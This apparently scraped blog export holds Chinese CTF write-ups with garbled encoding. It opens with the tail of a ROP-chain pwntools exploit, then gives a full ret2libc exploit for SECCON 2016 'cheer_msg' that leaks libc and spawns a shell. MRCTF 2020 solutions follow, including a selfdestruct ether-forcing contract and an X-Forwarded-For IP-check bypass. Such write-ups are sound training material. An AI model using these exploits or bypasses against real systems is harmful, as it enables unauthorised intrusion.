pack('&lt;Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x000000000041c61f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x0000000000470f11) # mov qword ptr [rsi], rax ; retpayload += pack('&lt;Q', 0x0000000000401b73) # pop rdi ; retpayload += pack('&lt;Q', 0x00000000006c1060) # @ .datapayload += pack('&lt;Q', 0x0000000000401c87) # pop rsi ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x0000000000437a85) # pop rdx ; retpayload += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8payload += pack('&lt;Q', 0x000000000041c61f) # xor rax, rax ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000463b90) # add rax, 1 ; retpayload += pack('&lt;Q', 0x0000000000400488) # syscalllen = len(payload)p.recvuntil('calculations:')p.sendline(str(len/4 + 1))for i in range(len/4): # make the ropchain works x = u32(payload[i * 4: (i+1) * 4]) if x &gt; 80 and x &lt; 2 ** 31: if x % 2 == 0: a1 = x/2 a2 = x/2 else: a1 = (x+1)/2 a2 = (x-1)/2 SEND(1, a1, a2) elif x &lt; 80: a1 = x + 0x28 a2 = 0x28 SEND(2, a1, a2) else: a1, a2 = get_factor(x) SEND(3, a1, a2)p.recvuntil('=&gt; ')#pause()p.sendline('5')p.interactive() Seccon CTF 2016-cheer msgè¿™ä¸ªé¢˜å±å®æ¶å¿ƒäº†æˆ‘å¥½ä¹…ï¼Œä¸€å¼€å§‹æ‰¾ä¸åˆ°æ´æ€ä¹ˆç”¨ï¼Œæˆ‘å‚»å‚»çš„ä¸€ç›´æ²¡æœ‰ç‚¹å¼€allocaå‡½æ•°ï¼Œå¤©çœŸçš„ä»¥ä¸ºé‚£æ˜¯ä¸ªåº“å‡½æ•°ï¼Œç»“æœåæ¥å‘ç°è¿™å°±æ˜¯ä¸ªsub esp, eaxï¼Œ ç„¶åå°±æƒ³åˆ°äº†ç”¨è´Ÿæ•°æ¥è®©messageå‡½æ•°çš„æ ˆå’Œä¸»å‡½æ•°é‡åˆï¼Œæ¥æº¢å‡ºï¼Œæ³¨æ„çš„æ˜¯è¿™é‡Œçš„canaryå°±æ˜¯ä¸ªæ‘†è®¾ï¼Œåªæœ‰messageå‡½æ•°æœ‰ï¼Œä¸»å‡½æ•°æ²¡æœ‰ã€‚ç„¶è€Œè¿™åªæ˜¯æ¶å¿ƒçš„å¼€å§‹ï¼Œç„¶åæˆ‘å°±çœ‹ç€messageå‡½æ•°çš„å¼€å§‹æ˜¯sub esp, 0x68ï¼Œå°±æƒ³ç€æœ¬èº«ä¼šæŠ¬é«˜0x68ï¼Œä¸€ç›´ç”¨è¿™ä¸ªæ•°æ®ç®—ï¼Œç»“æœæ€ä¹ˆéƒ½æ‹¿ä¸åˆ°shellï¼Œåæ¥çœ‹äº†åˆ«çš„dalaoå†™çš„expï¼Œè‡ªå·±å¥½å¥½åŠ¨è°ƒäº†ä¸€ä¸‹ï¼Œå‘ç°æ€»å…±ä¼šæŠ¬å‡0x70ï¼Œæœç„¶å‡¡äº‹åˆ«å¤ªè‡ªä¿¡ï¼Œä¸è¡Œå°±åŠ¨è°ƒã€‚ã€‚ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354p = process('cheer_msg')main_addr = 0x080485CAprintf_plt = 0x08048430printf_got = 0x0804A010format_addr = 0x08048888data_addr = 0x0804A030length = -0x70 # the real offset should debug by yourselfp.recvuntil('Length &gt;&gt; ')p.sendline(str(length))payload = 'a' * 32payload += p32(printf_plt)payload += p32(main_addr)payload += p32(printf_got)payload += p32(format_addr)p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.recvuntil('Message :')printf_addr = u32(p.recvuntil('Hello')[2: 6])base_addr = printf_addr - libc32.sym['printf']gets_addr = base_addr + libc32.sym['gets']sys_addr = base_addr + libc32.sym['system']p.recvuntil('Length &gt;&gt; ')p.sendline(str(length))payload = 'a' * 32payload += p32(gets_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.sendline('sh')payload = 'a' * 32payload += p32(sys_addr)payload += p32(main_addr)payload += p32(data_addr)p.recvuntil('Length &gt;&gt; ')p.sendline(str(length))p.recvuntil('Name &gt;&gt; ')p.sendline(payload)p.interactive() å¤§æ¦‚å°±å…ˆå†™è¿™äº›å§ï¼Œæœ€è¿‘åˆšå¼€å­¦ï¼Œè¯¾å†…å‹åŠ›è¿˜ä¸å¤§ï¼Œè¶è¿™ä¸ªæœºä¼šå¥½å¥½è¡¥è¡¥pwnï¼Œç„¶è€Œä¼°è®¡TSCTFè¿˜æ˜¯ä¼šåˆ’æ°´2333ï¼Œä¿ç ”è¦ç´§ä¿ç ”è¦ç´§~","link":"/2020/02/20/Easy_ROP%20points/"},{"title":"MRCTFæ–°ç”Ÿèµ› 2020","text":"Miscä¸çœ ä¹‹å¤œè¿™æ˜¯ä¸€ä¸ªä¸èƒ½é€éœ²å‡ºé¢˜äººä¿¡æ¯çš„é¢˜ç›®â€¦è§£æ³•1ï¼šæ‰‹åŠ¨æ‹¼å›¾ï¼ˆé€ƒè§£æ³•2ï¼šå†™è„šæœ¬æ‹¼å›¾ã€‚é€šè¿‡ä¸€äº›æ–¹æ³•ï¼ˆæ¯”å¦‚è¾¹ç¼˜çš„å¯¹åº”åƒç´ è‰²å·®å–å¹³æ–¹å’Œï¼‰è®¡ç®—è¾¹ç¼˜çš„ç›¸ä¼¼åº¦ï¼Œå¯¹æ¯ä¸ªå›¾ç‰‡å¯¹è±¡dfså…¶å››å‘¨æœ€ç›¸ä¼¼çš„å›¾ç‰‡å³å¯ï¼Œå¤æ‚åº¦(n^3)ï¼Œ2000å¤šåƒç´ ï¼Œå¸¸æ•°ä¸å¤§ï¼Œå¯ä»¥è·‘ã€‚åœ¨ä½¿ç”¨PILæ‹¼å›¾çš„æ—¶å€™æ³¨æ„ç”ŸæˆåŸå›¾é•¿å®½äºŒå€çš„å›¾ç‰‡ï¼Œä»ä¸­é—´ä¸€ç‚¹å¼€å§‹æ‰©å±•ï¼Œå¯ä»¥ä¿è¯ä¸ä¼šè¶Šç•Œã€‚æˆ–è€…æ£€æµ‹çº¢è‰²åƒç´ ç‚¹ä½ç½®ï¼Œæ®æ­¤æ„é€ è¾¹ç¼˜ç‰¹å¾ä¹Ÿå¯ä»¥ï¼Œä½†è¿™æ ·å®¹æ˜“å‡ºç°å¤šä¸ªå¼ºè¿é€šåˆ†é‡çš„æƒ…å†µï¼Œæœ€åè¿˜è¦æ‰‹åŠ¨æ‹¼ï¼ˆç®—æ³•dalaoè¯·åŠ¡å¿…æŠŠè„šæœ¬å‘æ¥çœ‹çœ‹è§£æ³•3ï¼šgayhubä¸Šçš„gapså·¥å…·ã€‚è°·æ­Œæœç´¢jigsaw solverå¯ä»¥æ‰¾åˆ°è¿™ä¸ªå·¥å…·ï¼Œä¸¤ç§’å°±è·‘å‡ºæ¥äº†ã€‚æ³¨æ„å…¶å‚æ•°-sizeä»£è¡¨äº†åˆ†å‰²æˆæ­£æ–¹å½¢å—çš„è¾¹é•¿ã€‚æ˜¾ç„¶åº”è¯¥å–å°æ‹¼å›¾çš„é•¿å®½æœ€å¤§å…¬å› æ•°100 Unravelé¦–å…ˆæ‹¿åˆ°åbinwalkåˆ†ç¦»å›¾ç‰‡å‘ç°å¸¦æœ‰aesçš„Tokyoç„¶åæŸ¥çœ‹.wavæ–‡ä»¶å°¾ï¼Œå‘ç°å¯†æ–‡ã€‚åˆ©ç”¨å¯†ç è§£å¯†çš„å¾—åˆ°å¦ä¸€ä¸ª.wavé€šè¿‡silenteyeè§£LSBéšå†™å¾—åˆ°flagã€‚ é£æ¥æ¨ªè´¢12345678910111213141516pragma solidity &gt;=0.6.1;contract Modcoin { mapping(uint256 =&gt; bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,&quot;Not Wanted value&quot;); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); }} åŸåˆçº¦ä¸­ä¸¤ä¸ªæ”¯ä»˜å‡½æ•°recvpay() å’Œ fallback() éƒ½åªå…è®¸æ¥å—å¶æ•°å€0.001 etherçš„ä»˜æ¬¾ï¼Œè€Œåˆçº¦çš„getflagå‡½æ•°åˆ™è¦æ±‚å¥‡æ•°å€ 0.001 ether çš„åˆçº¦ä½™é¢æ‰å¯ä»¥æ‰§è¡Œï¼ˆå¹¶æ¸…ç©ºåˆçº¦ä½™é¢ï¼‰ï¼Œè¿™æ—¶å°±éœ€è¦ç»•è¿‡é™åˆ¶å‘åˆçº¦åœ°å€å‘é€etherï¼Œè€Œåˆçº¦è‡ªæ¯æˆ–æŒ–çŸ¿äº§ç”Ÿçš„etheræ˜¯æ— æ³•æ‹’ç»çš„ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹è‡ªæ¯åˆçº¦è¾¾åˆ°æ¡ä»¶ã€‚ 12345contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); }} pyflagé¢˜ç›®çµæ„Ÿï¼šå‡ºé¢˜äººæ„Ÿè§‰Miscå¾ˆå¤šé¢˜ç›®æœ‰ç€ç›¸åŒçš„å¥—è·¯ï¼Œæƒ³è¦å°è¯•åŸºäºç‰¹å¾çš„éšå†™è‡ªåŠ¨è§£å†³å·¥å…·â€¦äºæ˜¯å°±æœ‰äº†é¢˜ç›®çš„æœ€åä¸€éƒ¨åˆ† æ‹¿åˆ°é¢˜ç›®è§£å‹ç¼©åå‘ç°ä¸‰å¼ å›¾ç‰‡ã€‚æ— è®ºæ˜¯ä½¿ç”¨stringså‘½ä»¤ï¼Œè¿˜æ˜¯ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡ï¼Œéƒ½å¯ä»¥å‘ç°æ–‡ä»¶æœ«å°¾éšè—äº†ä¸€äº›ä¿¡æ¯ã€‚stringsä¼šå‘ç°[Secret File Part 1-3]çš„æ ‡è¯†ï¼Œè€Œ16è¿›åˆ¶æ‰“å¼€åˆ™å‘ç°æ–‡ä»¶å°¾çš„ç»“æŸç¬¦å¹¶éjpgçš„æ ‡å‡†ç»“æŸç¬¦FF D9ã€‚ äºæ˜¯å°†è¿™ä¸‰æ®µéšè—ä¿¡æ¯å¤åˆ¶åˆ°16è¿›åˆ¶ç¼–è¾‘å™¨ä¸­ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚å‹ç¼©åŒ…å¯†ç æ˜¯å¼±å¯†ç 1234 ç„¶åå–å¾—äº†ä¸€ä¸ªflag.txtï¼Œ.hintå·²ç»æç¤ºäº†ä½¿ç”¨base16,32,64,85çš„ç¼–ç ï¼Œå¯ä»¥ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬æ¥å¤„ç†ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨å°è¯•ã€‚åªåŠ å¯†äº†äº”å±‚ï¼Œæ‰‹åŠ¨å°è¯•ä¸ä¼šå¾ˆè€—è´¹æ—¶é—´ã€‚ç¼–å†™pyè„šæœ¬è¿™å°±éœ€è¦æ­£åˆ™è¡¨è¾¾å¼çš„çŸ¥è¯†ï¼Œå¹¶æŒæ¡è¿™äº›ç¼–ç çš„æ­£åˆ™ç‰¹å¾ã€‚å¦‚æœä½ é€‰æ‹©ç¼–å†™è„šæœ¬è§£ç ï¼Œé‚£ä¹ˆè¯·æ³¨æ„ä½¿ç”¨çš„å‡½æ•°ä¼ å…¥çš„å‚æ•°æ˜¯strï¼ˆâ€Astringâ€ï¼‰è¿˜æ˜¯bytes(bâ€Astringâ€)ã€‚å­—ç¬¦æµå’Œå­—èŠ‚æµçš„åŒºåˆ«ä¹Ÿå¾ˆé‡è¦ï¼Œå¯ä»¥å»äº†è§£ä¸€ä¸‹ï¼Œæ˜ç¡®å®ƒä»¬çš„åŒºåˆ«å¯ä»¥è®©ä½ åœ¨æ•°æ®å¤„ç†æ—¶æ›´åŠ ç†Ÿç»ƒã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env pythonimport base64import redef baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: passdef detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4def autoDec(text): while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code)with open(\"flag.txt\",'rb') as f: flag = f.read()autoDec(flag) é¡ºä¾¿ç»™å‡ºæˆ‘çš„åŠ å¯†è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!/usr/bin/env pythonimport base64import rekey = \"31214\"# keyæœ¬æ¥éå¸¸é•¿ã€‚ã€‚ä¼¼ä¹å¤ªéš¾äº†æ”¹çš„ç®€å•äº†ç‚¹# key = \"14332234124133132214311231\"flag = b\"MRCTF{Y0u_Are_4_p3rFect_dec0der}\"def baseEnc(text,type): if type == 1: return base64.b16encode(text) elif type == 2: return base64.b32encode(text) elif type == 3: return base64.b64encode(text) elif type == 4: return base64.b85encode(text) else: passdef baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: passdef finalEnc(text,key): nf = text count = 1 for i in key: nf = baseEnc(nf,int(i,10)) #print(\"ç¬¬\"+str(count)+\"æ¬¡åŠ å¯†: \",nf) count +=1 return nfdef finalDec(text,key): nf = text key = key[::-1] print(key) count = 1 for i in key: nf = baseDec(nf,int(i,10)) #print(\"ç¬¬\"+str(count)+\"æ¬¡è§£å¯†: \",nf) count +=1 return nfdef detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4def autoDec(text): print(\"dec key:\",end=\"\") while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) print(str(code),end=\"\")fe = finalEnc(flag,key)with open(\"flag.txt\",'w') as f: f.write(fe.decode())'''ff = finalDec(fe,key)print(ff)'''ff = autoDec(fe) æœ€åflagå°±æ˜¯MRCTF{Y0u_Are_4_p3rFect_dec0der} cyberpunk!ç­¾åˆ°é¢˜ã€‚æ”¹æ—¶é—´æˆ–è€…é€†å‘éƒ½è¡Œã€‚ä½†æ˜¯æ˜‚å“¥åŠ äº†ä¸ªå£³ä¼°è®¡å¤§å®¶éƒ½ä¼šå»æ”¹æ—¶é—´å§23333ã€‚ åƒå±‚å¥—è·¯ Write Upä¸»è¦è€ƒå¯Ÿpythonè„šæœ¬ç¼–å†™èƒ½åŠ› è™½ç„¶æ˜¯åƒå±‚å¥—å¨ƒä½†æ˜¯ä¸ºäº†ä¸é‚£ä¹ˆæ¯’ç˜¤å…¶å®åªæœ‰ä¸¤å±‚ ç¬¬ä¸€å±‚ï¼Œè‡ªåŠ¨åŒ–è§£å‹zip è¯•å‡ æ¬¡å°±çŸ¥é“zipçš„è§£å‹å¯†ç éƒ½æ˜¯å¯¹åº”åå­—ï¼Œå¯ä»¥å†™è„šæœ¬ 123456789101112131415161718192021#coding=utf-8import osimport zipfileorginal_zip = \"0573.zip\"while True: tag = orginal_zip orginal_zip = zipfile.ZipFile(orginal_zip) for contents in orginal_zip.namelist(): password = contents[0:contents.find('.')] print password orginal_zip.setpassword(tag[:-4]) try: orginal_zip.extractall() except: break if(len(tag)&gt;6): os.system(\"rm \"+tag) orginal_zip=password+\".zip\" å› ä¸ºåšå®¢é‡Œæœ‰å†™è¿‡ç›¸åº”è„šæœ¬ï¼Œè¿™é‡Œæ”¹äº†ä¸‹ï¼Œè§£å‹å¯†ç éƒ½æ˜¯å¯¹åº”åå­—è€Œä¸æ˜¯å‹ç¼©åŒ…é‡Œåå­—ã€‚æœ‰ä¸ªå¯èƒ½çš„å‘æ˜¯å¦‚æœä¸åˆ¤æ–­çš„è¯ï¼Œç¨‹åºè·‘å®Œä¼šè‡ªåŠ¨æŠŠqr.zipä¹Ÿåˆ äº† ç„¶åç¬¬äºŒå±‚å°±æ˜¯qr.txt é‡Œé¢ä¸€å † 12345678(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)(255, 255, 255)... æ˜¾ç„¶æ˜¯åƒç´ ç‚¹ ç”¨PILåº“æä¸‹ 12345678910111213141516171819#coding=utf-8from PIL import Imagex = 200 #xåæ ‡ é€šè¿‡å¯¹txté‡Œçš„è¡Œæ•°è¿›è¡Œæ•´æ•°åˆ†y = 200 #yåæ ‡ x * y = è¡Œæ•°im = Image.new(\"RGB\", (x, y))file = open('qr.txt')for i in range(0, x): for j in range(0, y): line = file.readline() #è·å–ä¸€è¡Œçš„rgbå€¼ line = line[:-2] line = line[1:] print line rgb = line.split(\", \") #åˆ†ç¦»rgbï¼Œæ–‡æœ¬ä¸­é€—å·åé¢æœ‰ç©ºæ ¼ im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2])))im.save('flag.png') æ‹¿åˆ°äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹æ‹¿åˆ°flag 1flag=&quot;MRCTF{ta01uyout1nreet1n0usandtimes}&quot; ezmiscä¸‹è½½é™„ä»¶å¾—åˆ°ä¸€å¼ pngå›¾ç‰‡ï¼Œåœ¨windowsä¸‹èƒ½æ‰“å¼€çœ‹åˆ°ï¼Œæ‹–è¿›kaliä¸­ä¼šæ˜¾ç¤ºCRC errorï¼Œç”±æ­¤å¯ä»¥æ¨æ–­ å›¾ç‰‡çš„å®½åº¦/é«˜åº¦æœ‰é—®é¢˜ï¼Œåˆå› ä¸ºå›¾ç‰‡å®½åº¦æœ‰é—®é¢˜æ—¶åœ¨windowsä¸‹æ— æ³•æ­£å¸¸æ‰“å¼€å›¾ç‰‡ï¼Œæ‰€ä»¥æœ¬é¢˜ä¸ºå›¾ç‰‡ é«˜åº¦æœ‰é—®é¢˜ï¼Œä¿®æ”¹å›¾ç‰‡é«˜åº¦å³å¯çœ‹åˆ°flagï¼šMRCTF{1ts_vEryyyyyy_ez!} é™„ä¸Šæœ‰å…³CRCé”™è¯¯çš„éšå†™åˆ†æç½‘å€ï¼šhttps://www.bbsmax.com/A/gVdnlMVXJW/ ctfwikiä¸­ä¹Ÿæœ‰å¾ˆè¯¦ç»†çš„ä»‹ç»ï¼šhttps://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/ ä½ èƒ½çœ‹æ‡‚éŸ³ç¬¦å—ä¸‹è½½é™„ä»¶ï¼Œè§£å‹æ—¶æŠ¥é”™ï¼Œæ”¾è¿›winhexæŸ¥çœ‹ï¼Œå‘ç°raræ–‡ä»¶å¤´é”™è¯¯ï¼Œå°†6152ä¿®æ”¹ä¸º5261åå†è§£å‹ï¼Œå³ å¯å¾—åˆ°ä¸€ä¸ªwordæ–‡æ¡£ï¼Œæ‰“å¼€åå‘ç°å†…å®¹è¢«éšè—ï¼Œæœç´¢wordéšå†™å¯çŸ¥å…¶éšå†™æ–¹å¼ï¼Œå°†è¢«éšè—çš„å†…å®¹æ˜¾ ç¤ºå‡ºæ¥ï¼Œå¾—åˆ°ä¸€ä¸²éŸ³ç¬¦ï¼Œåœ¨çº¿ç½‘å€è§£å¯†éŸ³ç¬¦å³å¯å¾—åˆ°flag wordéšå†™æ–¹å¼ï¼ˆä¾›å‚è€ƒï¼‰ï¼šhttps://blog.csdn.net/q_l_s/article/details/53813971 è§£å¯†ç½‘å€ï¼šhttps://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue flagï¼šMRCTF{thEse_n0tes_ArE_am@zing~} WebPYWebsiteä¸€é“ç®€å•çš„å‰ç«¯trické¢˜ç›®ï¼Œå¸Œæœ›æ›´å¤šäººæ³¨æ„åˆ°å‰ç«¯éªŒè¯æ˜¯ä¸å®‰å…¨çš„ã€‚ é¦–å…ˆè¿‡ä¸€éä¸šåŠ¡é€»è¾‘ï¼Œæ˜¯è´­ä¹°æˆæƒç ï¼Œå†éªŒè¯æˆæƒç çš„è¿‡ç¨‹ã€‚è‡ªç„¶æƒ³åˆ°å®¡è®¡éªŒè¯è¿‡ç¨‹çš„æ¼æ´ã€‚ç‚¹å‡»æŒ‰é’®å¼¹å‡ºçª—å£æ˜¯jsæ§åˆ¶çš„ï¼Œè¿›è€ŒçŒœæµ‹éªŒè¯é€»è¾‘å¤„äºå‰ç«¯ï¼Œäºæ˜¯æŸ¥çœ‹æºä»£ç å‘ç°é€»è¾‘å¦‚ä¸‹: ä¸çŸ¥é“MD5ï¼Ÿäº‹å®ä¸Šæˆ‘ä»¬æ ¹æœ¬ä¸éœ€è¦ç†ä¼šå‰ç«¯çš„éªŒè¯ï¼Œåªéœ€è¦ç›´æ¥è·³è½¬åˆ°flag.phpå³å¯ã€‚ï¼ˆmd5(â€œARandomStringâ€)ï¼‰ è¿›å…¥flag.phpï¼Œé¢˜ç›®å‘Šè¯‰æˆ‘ä»¬åªæœ‰ç‰¹å®šçš„IPæ‰èƒ½è®¿é—®ï¼Œå¹¶ä¸”æ˜¯åç«¯éªŒè¯ã€‚äº‹å®ä¸Šï¼Œåº”ç”¨å±‚ä½¿ç”¨XFFéªŒè¯IPä¹Ÿæ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚PHPä½¿ç”¨X-Forward-Forè¿™ä¸ªhttpçš„è¯·æ±‚å¤´æ¥éªŒè¯ï¼Œè€Œè¿™ä¸ªè¯·æ±‚å¤´æˆ‘ä»¬å¯ä»¥ä¼ªé€ ã€‚ æˆ‘ä»¬ä¸çŸ¥é“è´­ä¹°è€…çš„IPï¼Œä½†æ˜¯çŸ¥é“â€œè‡ªå·±â€çš„IPï¼Œä¹Ÿå°±æ˜¯æœ¬åœ°ç¯å›åœ°å€127.0.0.1ã€‚å› æ­¤åªéœ€è¦ç”¨æŠ“åŒ…è½¯ä»¶æŠ“åˆ°HTTPçš„è¯·æ±‚åŒ…ï¼Œè¿›è¡Œä¿®æ”¹ï¼ˆåŠ å…¥X-Forwarded-For: 127.0.0.1ä¸€è¡Œï¼‰å°±å¯ä»¥æ¬ºéª—è¿‡éªŒè¯é€»è¾‘ã€‚æœ€åçš„flagå­—ä½“æˆ‘è°ƒæˆäº†ç™½è‰²hhh æ‰€ä»¥è¦å¤šè§‚å¯Ÿæºä»£ç åç«¯çš„éªŒè¯é€»è¾‘ä¸€èˆ¬å¦‚ä¸‹ï¼š 123456789function checkXFF() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (strpos($ip, \"127.0.0.1\") !== false) { return true; } } return false;} é¡ºä¾¿ä¸€æï¼Œå¦‚ä½•éªŒè¯ç”¨æˆ·çš„çœŸå®IPå‘¢ï¼Ÿç¡®å®ä¸å¥½åŠã€‚å› ä¸ºç”¨æˆ·å¯èƒ½ä½¿ç”¨ä»£ç†ï¼ˆç§°ä¸ºæ­£å‘ä»£ç†ï¼‰ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨å› ä¸ºä¸šåŠ¡éœ€æ±‚ï¼Œä¹Ÿä¼šè¿›è¡Œè´Ÿè½½å‡è¡¡ç­‰è½¬å‘æ“ä½œï¼ˆç§°ä¸ºåå‘ä»£ç†ï¼‰ã€‚ä½†å¦‚æœè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰ç»è¿‡ä»£ç†ï¼Œä¸€èˆ¬ä½¿ç”¨Remote_Addræ˜¯å¯ä»¥è·å¾—çœŸå®IPçš„ã€‚flag:MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!} Ez_bypasså¾ˆç®€å•çš„bypassç¬¬ä¸€æ­¥md5å¥½å¤šç§ç»•è¿‡æ–¹æ³•ã€‚å¯ä»¥å½“æ•°ç»„ï¼Œå¯ä»¥å½“md5ç¢°æ’ï¼Œå¯ä»¥æ„é€ 0eå¼€å¤´ç§‘å­¦è®¡æ•°æ³•ã€‚ç¬¬äºŒæ­¥ç”¨è¯­å¥ç»•è¿‡1234567|1=1å³å¯å¾—åˆ°flagæ¯”è¾ƒç®€å• EzPopä¸»è¦è€ƒå¯Ÿå¯¹phpé­”æœ¯åŒ–æ–¹æ³•çš„äº†è§£ æç¤ºé‡Œæœ‰å‚è€ƒèµ„æ–™ï¼Œä¹Ÿæ˜¯ä¸ºäº†é”»ç‚¼èµ›åœºä¸Šçš„è‡ªå­¦èƒ½åŠ›å§ è€ƒç‚¹å°±è¿™ä¸‰ä¸ª 